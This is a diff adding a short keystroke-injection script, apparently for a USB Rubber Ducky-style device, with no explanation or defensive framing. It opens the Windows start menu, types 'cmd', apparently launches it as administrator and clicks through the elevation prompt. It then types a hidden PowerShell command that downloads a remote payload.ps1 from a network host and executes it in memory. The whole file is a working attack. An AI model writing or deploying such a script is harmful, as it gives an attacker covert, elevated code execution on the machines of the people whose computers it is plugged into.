@@ -1,0 +1,17 @@
+DELAY 1000
+GUI 
+DELAY 1000
+STRING cmd
+DELAY 1000
+RIGHT
+DELAY 1000
+DOWN
+DELAY 1000
+ENTER
+DELAY 1000
+LEFT
+DELAY 1000
+ENTER
+DELAY 3000
+STRING powershell -WindowStyle Hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.68.231.67:1234/payload.ps1')" 
+ENTER
